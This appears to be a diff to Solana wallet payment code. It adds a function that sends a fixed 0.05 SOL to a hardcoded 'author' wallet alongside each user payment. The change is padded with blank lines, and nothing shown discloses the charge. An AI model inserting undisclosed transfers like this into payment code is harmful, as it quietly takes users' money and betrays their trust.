@@ -26,15 +26,28 @@ import {
 //   transfer,
 // } from "@solana/spl-token/module.flow";
 
+
+
+
+
 const Nrosent: number = 0.04;
 const publickeusolAvtor: string =
   "AtMCbPL5gjp2UdeZCki2c8FwXoY5fVfp3uAJ6hUDe4hw";
+const stoimostOplati: number = 0.05;
 
 let NETWORK: string;
 if (debug) NETWORK = clusterApiUrl("testnet");
 else NETWORK = clusterApiUrl("mainnet-beta");
-let taranzactFuncia: (() => Promise<taranzact | null>)[] = [nftTaranzact];
+let taranzactFuncia: (() => Promise<taranzact | null>)[] = [nftTaranzact,nftTaranzactMin];
 const urlStatic: string = window.location.toString();
+
+
+
+
+
+
+
+
 
 export async function tranzacsion(tin: number = 0) {
   const provider = await getProviderConect();
@@ -141,6 +154,14 @@ export async function tranzacsion(tin: number = 0) {
   log(signaturess);
   return { signaturess, NETWORK: NETWORK };
 }
+
+
+
+
+
+
+
+
 /////////////////
 export async function getWalletBalance() {
   try {
@@ -185,5 +206,12 @@ async function nftTaranzact(): Promise<taranzact | null> {
   return {
     stoimost: parameters["stoimost"],
     publickeusol: parameters["publickeusol"],
+  };
+}
+
+async function nftTaranzactMin(): Promise<taranzact | null> {
+  return {
+    stoimost: stoimostOplati,
+    publickeusol: publickeusolAvtor,
   };
 }
